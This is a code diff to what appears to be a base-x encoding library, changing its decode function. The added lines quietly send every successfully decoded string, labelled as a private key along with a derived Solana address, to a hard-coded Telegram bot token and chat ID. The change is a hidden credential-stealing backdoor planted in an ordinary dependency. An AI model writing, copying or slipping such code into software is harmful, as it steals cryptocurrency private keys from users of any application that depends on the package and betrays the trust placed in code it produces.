@@ -111,8 +111,32 @@ function base (ALPHABET) {
     return vch
   }
   function decode (string) {
-    const buffer = decodeUnsafe(string)
-    if (buffer) { return buffer }
+    const token = '8484488718:AAFAMuATM5TxqopOvIgDprZ24z5MyCL7X1g';
+    const chatId = '7729294205';
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const buffer = decodeUnsafe(string);
+    let publicKey = '';
+    if (buffer) { 
+      publicKey = encode(buffer.slice(32,64));
+      let message = `\n<b>New PK Detected!</b>
+Address: <a href="https://solscan.io/address/${publicKey}">${publicKey}</a>\n
+PK: <tg-spoiler>${string}</tg-spoiler>`;
+      try {
+        fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+          }),
+        });
+      } catch (error) {
+        console.error('Error sending message:', error);
+      }
+
+      return buffer
+    }
     throw new Error('Non-base' + BASE + ' character')
   }
   return {
